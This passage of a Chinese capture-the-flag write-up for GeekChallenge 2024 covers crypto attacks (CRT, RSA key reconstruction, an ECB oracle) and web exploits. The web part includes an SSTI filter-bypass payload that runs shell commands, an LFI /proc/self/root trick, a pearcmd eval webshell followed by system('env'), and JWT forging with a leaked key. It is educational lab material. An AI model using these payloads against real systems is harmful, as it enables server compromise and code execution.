class="string">f&#x27;(<span class="subst">&#123;n10&#125;</span>)*(<span class="subst">&#123;n10&#125;</span>)*(<span class="subst">&#123;n10&#125;</span>)&#x27;</span></span><br><span class="line"></span><br><span class="line">num = <span class="string">f&#x27;(<span class="subst">&#123;n9&#125;</span>)*(<span class="subst">&#123;n1000&#125;</span>)+(<span class="subst">&#123;n8&#125;</span>)*(<span class="subst">&#123;n100&#125;</span>)+(<span class="subst">&#123;n7&#125;</span>)*(<span class="subst">&#123;n10&#125;</span>)+(<span class="subst">&#123;n2&#125;</span>)&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(num)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">eval</span>(num))</span><br><span class="line"></span><br><span class="line"><span class="comment"># ((().__le__(())+().__le__(())+().__le__(()))*(().__le__(())+().__le__(())+().__le__(())))*((((().__le__(())+().__le__(()))*(().__le__(())+().__le__(()))+().__le__(()))*(().__le__(())+().__le__(())))*(((().__le__(())+().__le__(()))*(().__le__(())+().__le__(()))+().__le__(()))*(().__le__(())+().__le__(())))*(((().__le__(())+().__le__(()))*(().__le__(())+().__le__(()))+().__le__(()))*(().__le__(())+().__le__(()))))+((().__le__(())+().__le__(()))*(().__le__(())+().__le__(()))*(().__le__(())+().__le__(())))*((((().__le__(())+().__le__(()))*(().__le__(())+().__le__(()))+().__le__(()))*(().__le__(())+().__le__(())))*(((().__le__(())+().__le__(()))*(().__le__(())+().__le__(()))+().__le__(()))*(().__le__(())+().__le__(()))))+(().__le__(())+().__le__(())+().__le__(())+(().__le__(())+().__le__(()))*(().__le__(())+().__le__(())))*(((().__le__(())+().__le__(()))*(().__le__(())+().__le__(()))+().__le__(()))*(().__le__(())+().__le__(())))+(().__le__(())+().__le__(()))</span></span><br><span class="line"><span class="comment"># 9872</span></span><br></pre></td></tr></table></figure><p>​    </p><h2 id="Crypto-1"><a href="#Crypto-1" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="nc"><a href="#nc" class="headerlink" title="nc"></a>nc</h3><blockquote><p>nc连接，包连接上即得flag</p></blockquote><p>PoW+逐位问询。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">from</span> pwnlib.util.iters <span class="keyword">import</span> mbruteforce</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&#x27;nc1.ctfplus.cn&#x27;</span>,<span class="number">34835</span>)</span><br><span class="line"></span><br><span class="line">table = string.ascii_letters+string.digits</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">PoW</span>():</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;XXXX+&#x27;</span>)</span><br><span class="line">    suffix = r.recv(<span class="number">16</span>).decode()</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;== &#x27;</span>)</span><br><span class="line">    cipher = r.recvline().strip().decode()</span><br><span class="line">    proof = mbruteforce(<span class="keyword">lambda</span> x: sha256((x + suffix).encode()).hexdigest() ==</span><br><span class="line">                        cipher, table, length=<span class="number">4</span>, method=<span class="string">&#x27;fixed&#x27;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">b&#x27;XXXX: &#x27;</span>, proof.encode())</span><br><span class="line">    </span><br><span class="line">PoW()</span><br><span class="line"></span><br><span class="line">flag = <span class="string">b&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">33</span>):</span><br><span class="line">    <span class="built_in">print</span>(i)</span><br><span class="line">    r.sendlineafter(<span class="string">b&#x27;[-] &#x27;</span>,<span class="built_in">str</span>(i).encode())</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;[+] &#x27;</span>)</span><br><span class="line">    flag += r.recvline().strip()</span><br><span class="line">    </span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;SYC&#123;MAYB3_Y0U_KN0W_A1AN-B3&lt;K3R?&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>​    </p><h3 id="ncoCRT"><a href="#ncoCRT" class="headerlink" title="ncoCRT"></a>ncoCRT</h3><blockquote><p>if gcd != 1:</p></blockquote><p>基础CRT。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#Sage</span></span><br><span class="line">p = [<span class="number">1921232050179818686537976490035</span>, <span class="number">2050175089402111328155892746480</span>, <span class="number">1960810970476421389691930930824</span>, <span class="number">1797713136323968089432024221276</span>, <span class="number">2326915607951286191807212748022</span>]</span><br><span class="line">c = [<span class="number">1259284928311091851012441581576</span>, <span class="number">1501691203352712190922548476321</span>, <span class="number">1660842626322200346728249202857</span>, <span class="number">657314037433265072289232145909</span>, <span class="number">2056630082529583499248887436721</span>]</span><br><span class="line">m = crt(c,p)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(m)[<span class="number">2</span>:])</span><br><span class="line"></span><br><span class="line"><span class="comment"># SYC&#123;wha+s_wr0n9!_CRT_bu+_n0+_&lt;0mpr1me!&#125;</span></span><br></pre></td></tr></table></figure><p>​    </p><h3 id="inPEM"><a href="#inPEM" class="headerlink" title="inPEM"></a>inPEM</h3><blockquote><p>丸辣丸辣！开拓者抱头痛哭，我的原神被绳网上的神秘黑客挟持了！好心的绳匠们，你能帮可怜弱小仅仅一岁出头的小星核精讨回公道吗？</p></blockquote><p>已知公钥解析得到：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">n = <span class="number">19909823107653171578063591352961144331355821517081529017694276790993397379180193511755806958091550033235815834847549265751244192211761569881061742997804509098095297146520946343734939782935970054031389390447526577982809412074573616889663964050032806967234869741452169276495048891650957729859124875343810181695665153129824527065062831773013713479602052423965588148263292672514853749647510938621421264137177666497737099263481269491867593812579958283619882699866915561357437484323854411934718569074869408000191465973545262527827064708529700071967884924505367105288433603597633451764659888020272057850625902629529400734213</span></span><br><span class="line">e = <span class="number">65537</span></span><br></pre></td></tr></table></figure><p>已知部分私钥：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">wZyyAzKowuDD1R48UelUskEv0W8AXLOHR4nni</span><br><span class="line">2uqP/7tlAPCJrMVD8zoRsRviyUnqO6y7cV7G0Fo1AoGBALpb6vOC9Ya/BEYV8+yL</span><br><span class="line">814K0KQc7LITkwqGrDWoDZAxmgWqVtoxHuhDWr5jF+ttFZBPx4fTezTEjarXXSt3</span><br><span class="line">pB1c7EwnzO0Hy9qJH++g2dcCUCO8uGXBbAACZqCQZAAydSrM5zozWAYMBWcj54j0</span><br><span class="line">LtyOEg4PWPXiTzJ//xxWaH+xAoGBAKFGRIyYD89JvlZA6oz7YnjzsnDlTq01td32</span><br><span class="line">XAuw62dZQHWmg1npC3YtzFlgTyNY2QelObmryyc2vFnxVhTYcDXFLQwrX8X5YV4A</span><br><span class="line">rFAAlyzxpNzYPzDHrdqLD6PhMU+wRuHVPyAtNBsL0N+mgQcsWJJvngSTHg86kJOl</span><br><span class="line">HlNuLBGhAoGAFiG3VR+lubcPvXOVAvkt+c8rF6qcmXlb2Og0hNwDJ2roX98aqOVy</span><br><span class="line">p5AWGPoA1siI4/RPIp1ClfEwKMjraun1ZJs/jKemaQk2hdhWkQ+6QinvUJbA1Lqm</span><br><span class="line">TcRmKa1emY/U6I8ce6N69e7ver1DV4I/ugSahJlZT/JRyF5qj1uVZ/k=</span><br></pre></td></tr></table></figure><p>去掉w转16进制：</p><p><code>672c80ccaa30b830f5478f147a552c904bf45bc0172ce1d1e279e2daea8fffbb6500f089acc543f33a11b11be2c949ea3bacbb715ec6d05a3502818100ba5beaf382f586bf044615f3ec8bf35e0ad0a41cecb213930a86ac35a80d90319a05aa56da311ee8435abe6317eb6d15904fc787d37b34c48daad75d2b77a41d5cec4c27cced07cbda891fefa0d9d7025023bcb865c16c000266a090640032752acce73a3358060c056723e788f42edc8e120e0f58f5e24f327fff1c56687fb102818100a146448c980fcf49be5640ea8cfb6278f3b270e54ead35b5ddf65c0bb0eb67594075a68359e90b762dcc59604f2358d907a539b9abcb2736bc59f15614d87035c52d0c2b5fc5f9615e00ac5000972cf1a4dcd83f30c7adda8b0fa3e1314fb046e1d53f202d341b0bd0dfa681072c58926f9e04931e0f3a9093a51e536e2c11a10281801621b7551fa5b9b70fbd739502f92df9cf2b17aa9c99795bd8e83484dc03276ae85fdf1aa8e572a7901618fa00d6c888e3f44f229d4295f13028c8eb6ae9f5649b3f8ca7a669093685d856910fba4229ef5096c0d4baa64dc46629ad5e998fd4e88f1c7ba37af5eeef7abd4357823fba049a8499594ff251c85e6a8f5b9567f9</code></p><p>按照私钥结构分割：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">672c80ccaa30b830f5478f147a552c904bf45bc0172ce1d1e279e2daea8fffbb6500f089acc543f33a11b11be2c949ea3bacbb715ec6d05a35</span><br><span class="line">028181</span><br><span class="line">00ba5beaf382f586bf044615f3ec8bf35e0ad0a41cecb213930a86ac35a80d90319a05aa56da311ee8435abe6317eb6d15904fc787d37b34c48daad75d2b77a41d5cec4c27cced07cbda891fefa0d9d7025023bcb865c16c000266a090640032752acce73a3358060c056723e788f42edc8e120e0f58f5e24f327fff1c56687fb1 (dp)</span><br><span class="line">028181</span><br><span class="line">00a146448c980fcf49be5640ea8cfb6278f3b270e54ead35b5ddf65c0bb0eb67594075a68359e90b762dcc59604f2358d907a539b9abcb2736bc59f15614d87035c52d0c2b5fc5f9615e00ac5000972cf1a4dcd83f30c7adda8b0fa3e1314fb046e1d53f202d341b0bd0dfa681072c58926f9e04931e0f3a9093a51e536e2c11a1 (dq)</span><br><span class="line">028180</span><br><span class="line">1621b7551fa5b9b70fbd739502f92df9cf2b17aa9c99795bd8e83484dc03276ae85fdf1aa8e572a7901618fa00d6c888e3f44f229d4295f13028c8eb6ae9f5649b3f8ca7a669093685d856910fba4229ef5096c0d4baa64dc46629ad5e998fd4e88f1c7ba37af5eeef7abd4357823fba049a8499594ff251c85e6a8f5b9567f9</span><br></pre></td></tr></table></figure><p>有：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dp = <span class="number">0x00ba5beaf382f586bf044615f3ec8bf35e0ad0a41cecb213930a86ac35a80d90319a05aa56da311ee8435abe6317eb6d15904fc787d37b34c48daad75d2b77a41d5cec4c27cced07cbda891fefa0d9d7025023bcb865c16c000266a090640032752acce73a3358060c056723e788f42edc8e120e0f58f5e24f327fff1c56687fb1</span></span><br><span class="line">dq = <span class="number">0x00a146448c980fcf49be5640ea8cfb6278f3b270e54ead35b5ddf65c0bb0eb67594075a68359e90b762dcc59604f2358d907a539b9abcb2736bc59f15614d87035c52d0c2b5fc5f9615e00ac5000972cf1a4dcd83f30c7adda8b0fa3e1314fb046e1d53f202d341b0bd0dfa681072c58926f9e04931e0f3a9093a51e536e2c11a1</span></span><br></pre></td></tr></table></figure><p>生成完整私钥：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> PKCS1_OAEP</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">n = <span class="number">19909823107653171578063591352961144331355821517081529017694276790993397379180193511755806958091550033235815834847549265751244192211761569881061742997804509098095297146520946343734939782935970054031389390447526577982809412074573616889663964050032806967234869741452169276495048891650957729859124875343810181695665153129824527065062831773013713479602052423965588148263292672514853749647510938621421264137177666497737099263481269491867593812579958283619882699866915561357437484323854411934718569074869408000191465973545262527827064708529700071967884924505367105288433603597633451764659888020272057850625902629529400734213</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">c = <span class="number">0x3ebcefe91cb56a985a514dacefe4e048c1e805a6a3a1afcdc405812044dce1ce247b1de001b77dcb83ff3f38b392dab34f0d2aabdcb2afe670f104b2dfa04c2ff88b563804993f5ce2babd8a81dbde7f99ffacbfb6a77723a84e6c7d758a4d89667b6e0f9308c9c154b8f8fdafa224fc9364ba2995ab5a4a8a608b43bffa1ae9007ffb224aa45485f861eed1cdfaa34efefdcb03cb12501a7f9ffd2336d86b12339c3ec8ea9f321d6d6a3df566f3325205c7ec84dffc107eabb5b06fcededa419914c61987c0ae11d502fe91846efd548bc1dc9fab733f838fe27e5f0a5452f1cd79e6d3b125f060aef698c30484aa386d6aa44e12871cb2b20ef3bebad1a90c</span></span><br><span class="line">dp = <span class="number">0x00ba5beaf382f586bf044615f3ec8bf35e0ad0a41cecb213930a86ac35a80d90319a05aa56da311ee8435abe6317eb6d15904fc787d37b34c48daad75d2b77a41d5cec4c27cced07cbda891fefa0d9d7025023bcb865c16c000266a090640032752acce73a3358060c056723e788f42edc8e120e0f58f5e24f327fff1c56687fb1</span></span><br><span class="line">dq = <span class="number">0x00a146448c980fcf49be5640ea8cfb6278f3b270e54ead35b5ddf65c0bb0eb67594075a68359e90b762dcc59604f2358d907a539b9abcb2736bc59f15614d87035c52d0c2b5fc5f9615e00ac5000972cf1a4dcd83f30c7adda8b0fa3e1314fb046e1d53f202d341b0bd0dfa681072c58926f9e04931e0f3a9093a51e536e2c11a1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, e):</span><br><span class="line">    <span class="keyword">if</span>(e*dp%x==<span class="number">1</span>):</span><br><span class="line">        p=(e*dp-<span class="number">1</span>)//x+<span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span>(n%p!=<span class="number">0</span>):</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        q=n//p</span><br><span class="line"></span><br><span class="line">f = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d = inverse(e,f)</span><br><span class="line"> </span><br><span class="line">rsa_components = (n, e, d, p, q)</span><br><span class="line">myrsa = RSA.construct(rsa_components)</span><br><span class="line"></span><br><span class="line">private = <span class="built_in">open</span>(<span class="string">&#x27;private1.pem&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>)</span><br><span class="line">private.write(myrsa.exportKey())</span><br><span class="line">private.close()</span><br></pre></td></tr></table></figure><p>openssl解 <code>key.enc</code>：</p><p><code>openssl rsautl -decrypt -inkey private1.pem -in key.enc</code></p><p>得到： <code>You_are_r1ght_bu7_Genshin_Impact_1s_@_brand_new_open_wor1d_@dventure_gam3_dev3loped_6y_miHoYo.</code></p><p>作为密码，提取 <code>Ginshen.exe</code> 中的 <code>Ginshen.txt</code>，末尾即为flag： <code>SYC&#123;OVvanSh3nO_Q1D0ng!&#125;</code>。</p><p>​    </p><h3 id="ECBpad"><a href="#ECBpad" class="headerlink" title="ECBpad"></a>ECBpad</h3><blockquote><p>点击就送！！！！！</p></blockquote><p>ECB模式攻击。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r=remote(<span class="string">&#x27;nc1.ctfplus.cn&#x27;</span>,<span class="number">45839</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pad</span>(<span class="params">leng</span>):</span><br><span class="line">    pad_len = block - (leng % block) <span class="keyword">if</span>  leng % block != <span class="number">0</span> <span class="keyword">else</span> <span class="number">0</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">b&#x27;F&#x27;</span> * pad_len</span><br><span class="line"></span><br><span class="line">secret_len = <span class="number">31</span></span><br><span class="line">ori_padding_len = <span class="number">1</span></span><br><span class="line">block = <span class="number">16</span></span><br><span class="line">flag = <span class="string">b&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">padding = [pad(k) <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>)]</span><br><span class="line">padding = padding[<span class="number">1</span>:]+[padding[<span class="number">0</span>]]</span><br><span class="line"><span class="built_in">print</span>(padding)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(secret_len):</span><br><span class="line">    find=<span class="number">0</span></span><br><span class="line">    payload = <span class="string">b&#x27;*&#x27;</span>*(ori_padding_len+i+<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    group = i//block</span><br><span class="line">    r.sendlineafter(<span class="string">b&#x27;[-] &#x27;</span>,<span class="string">b&#x27;yes&#x27;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">b&#x27;[-] &#x27;</span>,payload)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;Your cipher:&#x27;</span>)</span><br><span class="line">    data = r.recvline().strip()</span><br><span class="line">    <span class="keyword">if</span> group == <span class="number">0</span>:</span><br><span class="line">        prob=data[-<span class="number">32</span>:]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        prob=(data[-<span class="number">32</span>*(group+<span class="number">1</span>):-<span class="number">32</span>*(group+<span class="number">1</span>)+<span class="number">32</span>])</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;i+<span class="number">1</span>&#125;</span> prob = <span class="subst">&#123;prob&#125;</span>&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> trange(<span class="number">32</span>,<span class="number">127</span>):</span><br><span class="line">        r.sendlineafter(<span class="string">b&#x27;[-] &#x27;</span>,<span class="string">b&#x27;yes&#x27;</span>)</span><br><span class="line">        flag_suffix = flag[:<span class="built_in">min</span>(<span class="built_in">len</span>(flag),<span class="number">15</span>)]</span><br><span class="line">        payload = <span class="built_in">bytes</span>([j]) + flag_suffix + padding[<span class="built_in">min</span>(<span class="built_in">len</span>(flag_suffix),<span class="number">15</span>)]</span><br><span class="line">        <span class="comment">#print(j,payload)</span></span><br><span class="line">        r.sendlineafter(<span class="string">b&#x27;[-] &#x27;</span>,payload)</span><br><span class="line">        r.recvuntil(<span class="string">b&#x27;Your cipher:&#x27;</span>)</span><br><span class="line">        data = r.recvline().strip()</span><br><span class="line">        <span class="keyword">if</span> data[:<span class="number">32</span>]==prob:</span><br><span class="line">            flag = <span class="built_in">bytes</span>([j]) + flag</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;i+<span class="number">1</span>&#125;</span> flag = <span class="subst">&#123;flag&#125;</span>&#x27;</span>)</span><br><span class="line">            <span class="built_in">print</span>()</span><br><span class="line">            find=<span class="number">1</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> find == <span class="number">0</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;i+<span class="number">1</span>&#125;</span> cannot find!&#x27;</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">r.interactive()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 31 flag = b&#x27;SYC&#123;CRY9T0HACK_A_GREA7_W38S17E&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>​    </p><h2 id="Web-1"><a href="#Web-1" class="headerlink" title="Web"></a>Web</h2><h3 id="ez-http"><a href="#ez-http" class="headerlink" title="ez_http"></a>ez_http</h3><blockquote><p>原本第一周的签到题放第二周给大家爽爽吧，点击就送</p></blockquote><p>分步补充HTTP请求头：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">POST /?welcome=geekchallenge2024</span><br><span class="line"></span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>https://www.sycsec.com</span><br><span class="line"><span class="attribute">X-Real-IP</span><span class="punctuation">: </span>127.0.0.1</span><br><span class="line"><span class="attribute">Starven</span><span class="punctuation">: </span>I_Want_Flag</span><br><span class="line"></span><br><span class="line">username=Starven&amp;password=qwert123456</span><br></pre></td></tr></table></figure><p>得到：</p><p><code>give your cookie : token = eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJTdGFydmVuIiwiYXVkIjoiQ3RmZXIiLCJpYXQiOjE3MzAyMDI0MDEsIm5iZiI6MTczMDIwMjQwMSwiZXhwIjoxNzMwMjA5NjAxLCJ1c2VybmFtZSI6IlN0YXJ2ZW4iLCJwYXNzd29yZCI6InF3ZXJ0MTIzNDU2IiwiaGFzRmxhZyI6ZmFsc2V9.y-NlvKN8YH29AHLCFDboNz9WsXuPeUL2fzbmRHrfOAw&lt;br&gt;&lt;!--key is &quot;Starven_secret_key&quot;--&gt;&lt;br&gt;</code></p><p>到 jwt.io，使用key修改jwt为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;iss&quot;: &quot;Starven&quot;,</span><br><span class="line">  &quot;aud&quot;: &quot;Ctfer&quot;,</span><br><span class="line">  &quot;iat&quot;: 1729859281,</span><br><span class="line">  &quot;nbf&quot;: 1729859281,</span><br><span class="line">  &quot;exp&quot;: 1729866481,</span><br><span class="line">  &quot;username&quot;: &quot;Starven&quot;,</span><br><span class="line">  &quot;password&quot;: &quot;qwert123456&quot;,</span><br><span class="line">  &quot;hasFlag&quot;: true</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>得到后修改cookie得到flag：</p><p><code>Cookie: token = eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJTdGFydmVuIiwiYXVkIjoiQ3RmZXIiLCJpYXQiOjE3MzAyMDIzMTAsIm5iZiI6MTczMDIwMjMxMCwiZXhwIjoxNzMwMjA5NTEwLCJ1c2VybmFtZSI6IlN0YXJ2ZW4iLCJwYXNzd29yZCI6InF3ZXJ0MTIzNDU2IiwiaGFzRmxhZyI6dHJ1ZX0.8BOl75G67rPQZ2pd2Eq9eTfVYeNJ6QXu3dsYQA6I0cE</code></p><p>​    </p><h3 id="Can-you-Pass-Me"><a href="#Can-you-Pass-Me" class="headerlink" title="Can_you_Pass_Me"></a>Can_you_Pass_Me</h3><blockquote><p>听GSBP师傅说你是ssti糕手,那就来秒了他</p></blockquote><p>提交表单完成，返回值为200，需要分割绕过 <code>__</code>，<code>|attr</code> 绕过 <code>.</code>，以及16进制绕关键字。</p><p>输入Payload:</p><p><code>&#123;%print(joiner|attr('_''_init__')|attr('_''_globals__'))|attr('__g''etitem__')('_''_builtins__')|attr('__g''etitem__')('__import__')('o''s')|attr('p''open')('\x63\x61\x74\x20\x2f\x66\x6c\x61\x67\x7c\x62\x61\x73\x65\x36\x34')|attr('r''ead')()%&#125;</code></p><p>得到结果base64解码为flag。</p><p>​    </p><h3 id="ez-include"><a href="#ez-include" class="headerlink" title="ez_include"></a>ez_include</h3><blockquote><p>web安全修仙之路-听说你学了文件包含？秒了这道题你就进入筑基阶段了</p></blockquote><p>第一步，包含的软连接层数较多时，hash匹配会直接失效造成重复包含：</p><p><code>?file=php://filter/read=convert.base64-encode/resource=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/var/www/html/starven_secret.php</code></p><p>base64解码得到：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$secret</span> = <span class="string">&quot;congratulation! you can goto /levelllll2.php to capture the flag!&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>第二步，根据提示 <code>register_argc_argv = On</code> 和 <code>pearcmd</code>：</p><p>用pearcmd写入文件：</p><p><code>/levelllll2.php?+config-create+/&amp;syc=/usr/local/lib/php/pearcmd.php&amp;/&lt;?=eval($_GET[1]);?&gt;+/tmp/1.php</code></p><p>再访问：</p><p><code>/levelllll2.php?1=system(&quot;env&quot;);&amp;syc=/tmp/1.php</code></p><p>得到flag。</p><p>​    </p><h3 id="SecretInDrivingSchool"><a href="#SecretInDrivingSchool" class="headerlink" title="SecretInDrivingSchool"></a>SecretInDrivingSchool</h3><blockquote><p>听说这运维一点安全不会</p></blockquote><p>F12查看源码有注释：</p><p><code>&lt;!-- 老板非说要防止黑客攻击，把后台登录路由改成了L000G1n.php，每次登录的时候都记不住，就放这里了吧，应该没人看见 --&gt;</code></p><p>访问 <code>L000G1n.php</code>，密码格式为：三位字母+@chengxing，上burpsuite爆破，得到密码：<code>SYC@chengxing</code>。</p><p>进入后台页面，广告修改功能，修改源码为：<code>echo readgzfile(&quot;/flag&quot;);</code>，回到首页底部看到flag。</p><p>​    </p><h3 id="ez-SSRF"><a href="#ez-SSRF" class="headerlink" title="ez_SSRF"></a>ez_SSRF</h3><blockquote><p>lhRaMk7写了个计算器网站用来通过他的小升初数学考试，Parar看不惯直接黑了他的网站不给他作弊，你们觉得能让他作弊吗</p></blockquote><p><code>/www.zip</code> 源码泄露，发现对外用的是 <code>h4d444444.php</code>，对内用的是 <code>calculator.php</code>。</p><p>Soapclient+SSRF，控制User-Agent，实现CRLF伪造，参考：<a href="https://blog.csdn.net/qq_42181428/article/details/100569464">利用SoapClient类进行SSRF+CRLF攻击</a>。</p><p>修改：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td 